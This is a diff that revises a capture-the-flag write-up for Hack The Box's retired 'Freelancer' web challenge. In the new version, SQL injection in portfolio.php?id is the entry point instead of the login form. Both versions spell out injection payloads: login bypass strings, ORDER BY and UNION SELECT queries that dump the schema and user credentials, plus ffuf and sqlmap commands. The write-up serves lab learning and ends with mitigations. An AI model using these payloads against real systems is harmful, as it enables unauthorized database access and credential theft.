@@ -4,7 +4,7 @@ type: Web
 difficulty: Easy
 platform: Hack The Box
 state: Retired
-tags: [web, sqli, login-bypass, union, database]
+tags: [web, sqli, union, mysql, admin-panel]
 ---
 
 # Freelancer — Hack The Box
@@ -15,63 +15,63 @@ tags: [web, sqli, login-bypass, union, database]
 
 ## TL;DR
 
-A freelancer platform with a login and a search box. The login builds its query by concatenation: **SQL injection**. Bypass with `' OR 1=1-- -` and pull the flag with `UNION SELECT` from the table holding it.
+The entry point is **not the login form**: it is `portfolio.php?id=1`, a `GET` parameter concatenated into the query (MySQL). A **three-column** `UNION` dumps the schema and yields the administrator credential; the `/admin` panel shows up during directory fuzzing, and that is the way to the flag.
 
 ## Brief
 
-A login with username and password plus a project search after signing in. MySQL/MariaDB backend.
+A Docker instance of a freelancer site: landing page, portfolios by `id` and a login form. No source code, so this is black-box testing.
 
-## Analysis
+## Recon
 
-Try the classic bypass in the username:
-
-```text
-username: ' OR 1=1-- -
-password: anything
+```bash
+ffuf -u http://<IP>/FUZZ -w /usr/share/wordlists/dirb/common.txt -mc 200,301,302
+# portfolio.php, /admin
+curl -s "http://<IP>/portfolio.php?id=1"
 ```
 
-If it logs in, the query is of the form:
+## The flaw
 
-```sql
-SELECT * FROM users WHERE username = '$u' AND password = '$p'
-```
-
-Find the column count:
+A quote in `id` breaks the query (`id=1'` returns an empty portfolio or loses the lorem text): classic injection in a `SELECT` with **three columns**.
 
 ```text
-' ORDER BY 1-- -
-' ORDER BY 2-- -
-...
+id=1' ORDER BY 3-- -
+id=1' UNION SELECT 1,2,3-- -
+id=-1' UNION SELECT 1,version(),database()-- -
+```
+
+```text
+5.7.x | <database>
 ```
 
 ## Exploitation
 
-With the login bypassed, the search box is the extraction point:
+Enumerate the schema and pull the user table:
 
 ```text
-' UNION SELECT 1,2,3-- -
+id=-1' UNION SELECT 1,table_name,3 FROM information_schema.tables WHERE table_schema=database()-- -
+id=-1' UNION SELECT 1,column_name,3 FROM information_schema.columns WHERE table_name='<table>'-- -
+id=-1' UNION SELECT 1,concat(username,0x3a,password),3 FROM <table>-- -
 ```
 
-Place the visible columns, then enumerate schema and tables:
+The challenge is old and the password is stored in clear text or with a trivial hash, so the recovered value logs into `/admin`. Automated:
 
-```text
-' UNION SELECT 1,table_name,3 FROM information_schema.tables WHERE table_schema=database()-- -
-' UNION SELECT 1,column_name,3 FROM information_schema.columns WHERE table_name='<table>'-- -
-' UNION SELECT 1,<column>,3 FROM <table>-- -
+```bash
+sqlmap -u "http://<IP>/portfolio.php?id=1" --batch --dbs --privileges
 ```
 
-```text
-HTB{<flag>}
-```
+Public writeups disagree on the last step: some read the flag straight from the database dump, others collect it from `/admin` after logging in. Both routes start from the same `UNION`.
 
-## Pitfalls
+## Evidence
 
-- **Comment syntax**: MySQL needs `-- -` with a space, or `#`; otherwise the query is invalid.
-- **Escaped quotes**: try variants with `"` or `\'`.
-- **Columns**: if `UNION` fails, fix the count with `ORDER BY` first.
+- Trimmed output of the key commands; no flags, credentials or tokens.
+- Real values live in `private/` and are not published.
 
-## Lessons
+## Lessonslearned
 
-- A SQLi-vulnerable login hands over the whole database, not just access.
-- `UNION` turns any reflected field into an extraction channel.
-- Mitigation: prepared statements, a least-privilege DB user, and a WAF as an extra layer.
+- **Read the HTML before the login form**: the `href="portfolio.php?id=1"` saves half an hour.
+- **Columns first**: `ORDER BY`, then `UNION SELECT 1,2,3`.
+- **`-1` in the `id`**: without it the legitimate row hides the injection result.
+
+- A numeric `GET` parameter is suspect number one in any web challenge.
+- `UNION` turns any reflected column into an extraction channel.
+- Mitigation: prepared statements and a least-privilege database account.
